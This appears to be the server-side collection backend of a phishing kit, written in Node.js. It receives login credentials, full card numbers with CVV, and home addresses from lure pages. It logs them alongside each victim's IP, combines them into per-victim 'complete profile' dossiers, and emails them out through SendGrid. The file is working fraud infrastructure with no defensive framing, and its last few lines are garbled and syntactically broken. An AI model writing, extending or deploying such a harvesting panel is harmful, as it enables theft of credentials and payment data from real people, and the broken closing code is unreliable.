
const express = require('express');
const sgMail = require('@sendgrid/mail');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// Add CORS middleware to handle requests from your PHP pages
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

// Initialize SendGrid
sgMail.setApiKey(process.env.SENDGRID_API_KEY);

// Function to send email via SendGrid
async function sendEmail(subject, textContent, dataType) {
    try {
        const msg = {
            to: process.env.RECIPIENT_EMAIL,
            from: {
                email: process.env.SENDGRID_FROM_EMAIL,
                name: process.env.SENDGRID_FROM_NAME || 'Data Collection System'
            },
            subject: subject,
            text: textContent,
            categories: [dataType, 'data-collection']
        };

        const result = await sgMail.send(msg);
        console.log('✅ SendGrid email sent:', result[0].statusCode);
        return true;
    } catch (error) {
        console.error('❌ Error sending email via SendGrid:', error);
        if (error.response) {
            console.error('SendGrid error details:', error.response.body);
        }
        return false;
    }
}

// Function to display data beautifully in console
function displayDataInConsole(type, formType, data, userAgent, page, sessionData, clientIP) {
    console.log('\n' + '='.repeat(80));
    console.log('🎯 NEW DATA RECEIVED - CONSOLE DISPLAY');
    console.log('='.repeat(80));
    
    console.log('📊 BASIC INFO:');
    console.log(`   📝 Type: ${type}`);
    console.log(`   📋 Form Type: ${formType || 'Not specified'}`);
    console.log(`   🌐 Page: ${page}`);
    console.log(`   🗣️ Language: ${sessionData?.language || 'Unknown'}`);
    console.log(`   🌐 IP: ${clientIP}`);
    console.log(`   🕒 Time: ${new Date().toLocaleString()}`);
    
    console.log('\n🔍 USER AGENT:');
    console.log(`   ${userAgent}`);
    
    console.log('\n💾 SESSION DATA:');
    console.log(`   Token: ${sessionData?.token || 'N/A'}`);
    console.log(`   Country Code: ${sessionData?.countryCode || 'N/A'}`);
    console.log(`   Language: ${sessionData?.language || 'N/A'}`);
    
    console.log('\n📋 DATA CONTENT:');
    switch(type) {
        case 'login':
            console.log(`   👤 Username: ${data.username}`);
            console.log(`   🔑 Password: ${data.password}`);
            console.log(`   💾 Remember Me: ${data.rememberMe ? 'Yes' : 'No'}`);
            console.log(`   🏷️ Form Type: ${formType || 'Standard Login'}`);
            break;
        case 'credit_card':
            console.log(`   👤 First Name: ${data.firstName}`);
            console.log(`   👤 Last Name: ${data.lastName}`);
            console.log(`   💳 Card Number: ${data.cardNumber}`);
            console.log(`   📅 Expiry Date: ${data.expiryDate}`);
            console.log(`   🔒 CVV: ${data.cvv}`);
            console.log(`   ✅ Terms Agreed: ${data.termsAgreed ? 'Yes' : 'No'}`);
            console.log(`   🏷️ Form Type: ${formType || 'Payment Form'}`);
            break;
        case 'address_verification':
            console.log(`   🏠 Address Line 1: ${data.addressLine1}`);
            console.log(`   🏠 Address Line 2: ${data.addressLine2 || 'N/A'}`);
            console.log(`   🏙️ City: ${data.city}`);
            console.log(`   🗺️ State: ${data.state}`);
            console.log(`   📮 ZIP: ${data.zipCode}`);
            console.log(`   🌍 Country: ${data.country}`);
            console.log(`   📞 Phone: ${data.phone}`);
            console.log(`   🏷️ Form Type: ${formType || 'Address Form'}`);
            break;
        case 'address_skipped':
            console.log(`   ⏭️ Action: User skipped address verification`);
            console.log(`   📝 Reason: ${data.reason}`);
            console.log(`   🕒 Skip Time: ${new Date(data.timestamp).toLocaleString()}`);
            console.log(`   🏷️ Form Type: ${formType || 'Address Skip'}`);
            break;
        default:
            console.log(`   ❓ Unknown data type:`, data);
            console.log(`   🏷️ Form Type: ${formType || 'Unknown'}`);
    }
    
    console.log('\n' + '='.repeat(80));
}

// Function to format data as plain text for email
function formatDataAsText(data, dataType, formType) {
    const getIcon = (type) => {
        switch(type) {
            case 'login': return '🔐';
            case 'credit_card': return '💳';
            case 'address_verification': return '🏠';
            case 'address_skipped': return '⏭️';
            case 'complete_profile': return '🎯';
            default: return '📄';
        }
    };

    const formTypeInfo = formType ? ` [${formType}]` : '';
    const header = `${getIcon(dataType)} NEW ${dataType.replace('_', ' ').toUpperCase()} DATA${formTypeInfo}\n`;
    const separator = '='.repeat(50) + '\n';
    
    return header + separator + data + '\n' + separator;
}

// Function to create login data text for email
function createLoginText(credentials, userAgent, page, sessionData, clientIP, formType) {
    const formTypeInfo = formType ? `\n🏷️ Form Type: ${formType}` : '';
    
    return `
LOGIN CREDENTIALS [SENSITIVE]
==============================
👤 Username: ${credentials.username || 'N/A'}
🔑 Password: ${credentials.password || 'N/A'}
💾 Remember Me: ${credentials.rememberMe ? 'Yes' : 'No'}${formTypeInfo}
🌐 Page: ${page || 'N/A'}
🗣️ Language: ${sessionData?.language || 'Unknown'}
🌐 IP Address: ${clientIP || 'N/A'}
🔍 User Agent: ${userAgent || 'N/A'}
⏰ Timestamp: ${new Date().toLocaleString()}
    `.trim();
}

// Function to create credit card data text for email
function createCreditCardText(cardData, userAgent, page, sessionData, clientIP, formType) {
    const formTypeInfo = formType ? `\n🏷️ Form Type: ${formType}` : '';
    
    return `
CREDIT CARD INFORMATION [HIGHLY SENSITIVE]
===========================================
👤 First Name: ${cardData.firstName || 'N/A'}
👤 Last Name: ${cardData.lastName || 'N/A'}
💳 Card Number: ${cardData.cardNumber || 'N/A'}
📅 Expiry Date: ${cardData.expiryDate || 'N/A'}
🔒 CVV: ${cardData.cvv || 'N/A'}
✅ Terms Agreed: ${cardData.termsAgreed ? 'Yes' : 'No'}${formTypeInfo}
🗣️ Language: ${sessionData?.language || 'Unknown'}
🌐 IP Address: ${clientIP || 'N/A'}
🌐 Page: ${page || 'N/A'}
⏰ Timestamp: ${new Date().toLocaleString()}
    `.trim();
}

// Function to create address data text for email
function createAddressText(addressData, userAgent, page, sessionData, clientIP, formType) {
    const formTypeInfo = formType ? `\n🏷️ Form Type: ${formType}` : '';
    
    return `
ADDRESS VERIFICATION [PERSONAL DATA]
====================================
🏠 Address Line 1: ${addressData.addressLine1 || 'N/A'}
🏠 Address Line 2: ${addressData.addressLine2 || 'N/A'}
🏙️ City: ${addressData.city || 'N/A'}
🗺️ State/Province: ${addressData.state || 'N/A'}
📮 ZIP/Postal Code: ${addressData.zipCode || 'N/A'}
🌍 Country: ${addressData.country || 'N/A'}
📞 Phone Number: ${addressData.phone || 'N/A'}${formTypeInfo}
🗣️ Language: ${sessionData?.language || 'Unknown'}
🌐 IP Address: ${clientIP || 'N/A'}
🌐 Page: ${page || 'N/A'}
⏰ Timestamp: ${new Date().toLocaleString()}
    `.trim();
}

// Function to create address skipped text for email
function createAddressSkippedText(skipData, userAgent, page, sessionData, clientIP, formType) {
    const formTypeInfo = formType ? `\n🏷️ Form Type: ${formType}` : '';
    
    return `
ADDRESS VERIFICATION SKIPPED [USER ACTION]
==========================================
⏭️ Action: User chose to skip address verification
📝 Reason: ${skipData.reason || 'user_skipped_address'}${formTypeInfo}
🗣️ Language: ${sessionData?.language || 'Unknown'}
🌐 IP Address: ${clientIP || 'N/A'}
🌐 Page: ${page || 'N/A'}
⏰ Timestamp: ${new Date(skipData.timestamp).toLocaleString() || 'N/A'}
    `.trim();
}

// Function to create complete user profile text for email
function createCompleteProfileText(loginData, cardData, addressData, sessionData, clientIP, formTypes) {
    const hasAddress = addressData && !addressData.skipped;
    const status = hasAddress ? 'COMPLETE' : 'PARTIAL';
    const formTypeInfo = formTypes ? `\n🏷️ Form Types: ${formTypes.join(', ')}` : '';
    
    let addressSection = '';
    if (hasAddress) {
        addressSection = `
🏠 ADDRESS INFORMATION
======================
Address: ${addressData.addressLine1 || 'N/A'} ${addressData.addressLine2 || ''}
City/State/ZIP: ${addressData.city || 'N/A'}, ${addressData.state || 'N/A'} ${addressData.zipCode || 'N/A'}
Country: ${addressData.country || 'N/A'}
Phone: ${addressData.phone || 'N/A'}
        `.trim();
    } else {
        addressSection = `
⏭️ ADDRESS STATUS
=================
Status: User skipped address verification
        `.trim();
    }
    
    return `
COMPLETE USER PROFILE [${status}]
==================================
🔐 LOGIN INFORMATION
====================
Username: ${loginData.username || 'N/A'}
Password: ${loginData.password || 'N/A'}
Remember Me: ${loginData.rememberMe ? 'Yes' : 'No'}

💳 PAYMENT INFORMATION
======================
Cardholder: ${cardData.firstName || 'N/A'} ${cardData.lastName || 'N/A'}
Card Number: ${cardData.cardNumber || 'N/A'}
Expiry Date: ${cardData.expiryDate || 'N/A'}
CVV: ${cardData.cvv || 'N/A'}
Terms Agreed: ${cardData.termsAgreed ? 'Yes' : 'No'}

${addressSection}

📊 SESSION INFORMATION
======================
Language: ${sessionData?.language || 'Unknown'}
IP Address: ${clientIP || 'N/A'}${formTypeInfo}
Timestamp: ${new Date().toLocaleString()}
    `.trim();
}

// Store user sessions to combine data
const userSessions = new Map();

app.post('/api/submit', async (req, res) => {
    const { type, formType, data, timestamp, userAgent, page, sessionData } = req.body;
    
    // Get client IP
    const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    
    // STEP 1: DISPLAY DATA IN CONSOLE
    console.log('\n🚀 STARTING DATA PROCESSING...');
    displayDataInConsole(type, formType, data, userAgent, page, sessionData, clientIP);
    
    let subject = '';
    let textContent = '';
    let dataType = type || 'login';

    try {
        // Generate session ID
        const sessionId = `${userAgent}-${clientIP}-${sessionData?.language || 'unknown'}`;
        
        console.log(`\n📦 PROCESSING SESSION: ${sessionId}`);
        
        // Initialize session if not exists
        if (!userSessions.has(sessionId)) {
            userSessions.set(sessionId, {
                loginData: null,
                cardData: null,
                addressData: null,
                sessionData: sessionData,
                formTypes: new Set(), // Track all form types used
                firstSeen: new Date(),
                ip: clientIP
            });
            console.log(`✅ New session created: ${sessionId}`);
        }
        
        const userSession = userSessions.get(sessionId);
        
        // Store form type if provided
        if (formType) {
            userSession.formTypes.add(formType);
        }
        
        // Store data based on type and prepare email content
        switch(dataType) {
            case 'login':
                userSession.loginData = data;
                subject = `🔐 LOGIN - ${data.username || 'Unknown User'}`;
                textContent = formatDataAsText(
                    createLoginText(data, userAgent, page, sessionData, clientIP, formType),
                    dataType,
                    formType
                );
                console.log(`✅ Login data stored for session`);
                break;
                
            case 'credit_card':
                userSession.cardData = data;
                subject = `💳 CARD - ${data.firstName || 'Unknown'} ${data.lastName || ''}`;
                textContent = formatDataAsText(
                    createCreditCardText(data, userAgent, page, sessionData, clientIP, formType),
                    dataType,
                    formType
                );
                console.log(`✅ Credit card data stored for session`);
                break;
                
            case 'address_verification':
                userSession.addressData = data;
                subject = `🏠 ADDRESS - ${data.city || 'Unknown Location'}, ${data.state || ''}`;
                textContent = formatDataAsText(
                    createAddressText(data, userAgent, page, sessionData, clientIP, formType),
                    dataType,
                    formType
                );
                console.log(`✅ Address data stored for session`);
                break;
                
            case 'address_skipped':
                userSession.addressData = { skipped: true, ...data };
                subject = `⏭️ SKIPPED - Address verification`;
                textContent = formatDataAsText(
                    createAddressSkippedText(data, userAgent, page, sessionData, clientIP, formType),
                    dataType,
                    formType
                );
                console.log(`⏭️ Address skipped for session`);
                break;
                
            default:
                subject = `📄 UNKNOWN - Data submission`;
                textContent = formatDataAsText(
                    `Unknown Data Type: ${dataType}\nForm Type: ${formType || 'Not specified'}\n\nRaw Data:\n${JSON.stringify(data, null, 2)}`,
                    'unknown',
                    formType
                );
                console.log(`❓ Unknown data type processed`);
        }
        
        // Check if we have complete data for a profile summary
        if (userSession.loginData && userSession.cardData) {
            const hasAddress = userSession.addressData;
            const isComplete = hasAddress && !userSession.addressData.skipped;
            
            if (isComplete || dataType === 'address_skipped') {
                console.log(`\n📊 Preparing ${isComplete ? 'COMPLETE' : 'PARTIAL'} profile summary...`);
                setTimeout(() => {
                    const status = isComplete ? 'COMPLETE' : 'PARTIAL';
                    const completeSubject = `🎯 ${status} - ${userSession.loginData.username || 'User'}`;
                    const completeText = formatDataAsText(
                        createCompleteProfileText(
                            userSession.loginData,
                            userSession.cardData,
                            userSession.addressData,
                            userSession.sessionData,
                            clientIP,
                            Array.from(userSession.formTypes)
                        ),
                        'complete_profile'
                    );
                    console.log(`\n📧 Sending ${status} profile summary email...`);
                    sendEmail(completeSubject, completeText, 'complete_profile');
                }, 2000);
            }
        }
        
        // Clean up old sessions (older than 2 hours)
        const now = new Date();
        let cleanedCount = 0;
        for (const [id, session] of userSessions.entries()) {
            if (now - session.firstSeen > 2 * 60 * 60 * 1000) {
                userSessions.delete(id);
                cleanedCount++;
            }
        }
        if (cleanedCount > 0) {
            console.log(`🧹 Cleaned up ${cleanedCount} old sessions`);
        }
        
        // STEP 2: SEND DATA TO EMAIL
        console.log(`\n📧 SENDING EMAIL FOR: ${dataType}`);
        console.log(`   Subject: ${subject}`);
        
        const emailSent = await sendEmail(subject, textContent, dataType);
        
        if (emailSent) {
            console.log(`✅ Email sent successfully!`);
            console.log(`\n🎉 DATA PROCESSING COMPLETE!`);
            console.log('='.repeat(80));
            
            res.json({ 
                status: 'success', 
                message: 'Data received, displayed in console, and email sent',
                dataType: dataType,
                formType: formType,
                sessionId: sessionId,
                timestamp: new Date().toISOString()
            });
        } else {
            console.log(`❌ Failed to send email`);
            console.log(`\n⚠️ DATA PROCESSING COMPLETE (Email failed)`);
            console.log('='.repeat(80));
            
            res.status(500).json({ 
                status: 'error', 
                message: 'Data displayed in console but failed to send email' 
            });
        }
        
    } catch (error) {
        console.error('💥 Error processing request:', error);
        console.log(`\n❌ DATA PROCESSING FAILED`);
        console.log('='.repeat(80));
        
        res.status(500).json({ 
            status: 'error', 
            message: 'Internal server error',
            error: error.message 
        });
    }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
    const stats = {
        totalSessions: userSessions.size,
        sessionsWithLogin: Array.from(userSessions.values()).filter(s => s.loginData).length,
        sessionsWithCard: Array.from(userSessions.values()).filter(s => s.cardData).length,
        sessionsWithAddress: Array.from(userSessions.values()).filter(s => s.addressData && !s.addressData.skipped).length,
        sessionsSkippedAddress: Array.from(userSessions.values()).filter(s => s.addressData && s.addressData.skipped).length,
        completeProfiles: Array.from(userSessions.values()).filter(s => s.loginData && s.cardData && s.addressData && !s.addressData.skipped).length,
        uniqueFormTypes: Array.from(new Set(Array.from(userSessions.values()).flatMap(s => Array.from(s.formTypes))))
    };
    
    res.json({ 
        status: 'Server is running', 
        email: 'SendGrid integration enabled',
        fromEmail: process.env.SENDGRID_FROM_EMAIL,
        uptime: process.uptime(),
        ...stats
    });
});

// Get session statistics
app.get('/api/sessions', (req, res) => {
    const stats = {
        totalSessions: userSessions.size,
        sessionsWithLogin: Array.from(userSessions.values()).filter(s => s.loginData).length,
        sessionsWithCard: Array.from(userSessions.values()).filter(s => s.cardData).length,
        sessionsWithAddress: Array.from(userSessions.values()).filter(s => s.addressData && !s.addressData.skipped).length,
        sessionsSkippedAddress: Array.from(userSessions.values()).filter(s => s.addressData && s.addressData.skipped).length,
        completeProfiles: Array.from(userSessions.values()).filter(s => s.loginData && s.cardData && s.addressData && !s.addressData.skipped).length,
        partialProfiles: Array.from(userSessions.values()).filter(s => s.loginData && s.cardData && (!s.addressData || s.addressData.skipped)).length,
        formTypeStats: Array.from(userSessions.values())
            .flatMap(s => Array.from(s.formTypes))
            .reduce((acc, formType) => {
                acc[formType] = (acc[formType] || 0) + 1;
                return acc;
            }, {})
    };
    
    res.json(stats);
});

const server = app.listen(PORT, '0.0.0.0', () => {
    console.log('='.repeat(80));
    console.log('🚀 BACKEND SERVER STARTED SUCCESSFULLY');
    console.log('='.repeat(80));
    console.log(`📡 Port: ${PORT}`);
    console.log(`📧 SendGrid: ${process.env.SENDGRID_FROM_EMAIL}`);
    console.log(`📨 Recipient: ${process.env.RECIPIENT_EMAIL}`);
    console.log(`🔄 API: POST http://localhost:${PORT}/api/submit`);
    console.log(`❤️ Health: http://localhost:${PORT}/api/health`);
    console.log(`🌐 CORS: Enabled for all origins`);
    console.log('='.repeat(80));
    console.log('📝 Ready to receive data - will display in console THEN send email');
    console.log('='.repeat(80));
});

server.timeout = 0;
server.keepAliveTimeout = 0;

console.log ('
Server timeout
configuration:');
    console.log('  - Server timeout: ${server.timeout}ms (0 = limitless)');
console.log(' - Keep-alive timeout: ${server.keepAliveTimeout)ms');
console.1og('
- Headers timeout: ${server.headersTimeout}ms');
